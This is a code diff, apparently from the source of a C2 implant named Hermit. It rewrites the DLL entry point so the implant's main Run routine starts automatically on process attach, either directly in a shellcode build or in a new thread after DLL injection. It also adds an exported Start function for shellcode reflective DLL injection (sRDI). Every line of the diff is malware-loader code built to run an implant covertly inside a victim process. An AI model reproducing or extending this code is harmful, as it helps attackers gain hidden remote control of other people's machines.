@@ -2,11 +2,7 @@
 
 #define MAX_THREADS 3
 
-extern HINSTANCE hAppInstance;
-
-DWORD WINAPI ThreadProc(LPVOID lpParam);
-
-DWORD WINAPI ThreadProc(LPVOID lpParam)
+DWORD WINAPI RunWrapper(LPVOID lpParam)
 {
     Hermit::Run(
         NULL,
@@ -43,35 +39,44 @@ DWORD WINAPI ThreadProc(LPVOID lpParam)
 
 DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
-    BOOL bReturnValue = TRUE;
-
     HANDLE hThread = NULL;
 
     switch (fdwReason)
     {
         case DLL_QUERY_HMODULE:
-            if(lpReserved)
-                *(HMODULE*)lpReserved = hAppInstance;
             break;
         case DLL_PROCESS_ATTACH:
-            hAppInstance = hinstDLL;
-            // MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK );
-
+            #ifdef IS_SHELLCODE
+            RunWrapper(nullptr);
+            #else
             // Execute the Run function within a new thread
-            // because WinHTTP functions are not usable in DllMain.
+            // because WinHTTP functions are not usable in DllMain when DLL Injection.
             hThread = CreateThread(
                 NULL,
                 0,
-                ThreadProc,
+                RunWrapper,
                 hinstDLL,
                 0,
                 NULL
             );
+            #endif
+
             break;
         case DLL_PROCESS_DETACH:
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
             break;
     }
-    return bReturnValue;
+    return TRUE;
 }
+
+#ifdef IS_SHELLCODE
+// This function is called for sRDI (Shellcode Reflective DLL Injection)
+// But currently this is not used actually...
+DLLEXPORT BOOL Start(LPVOID lpArg, DWORD dwArgLen)
+{
+    // MessageBoxA(NULL, "Start", "Start", MB_OK);
+    return TRUE;
+}
+
+#endif // IS_SHELLCODE
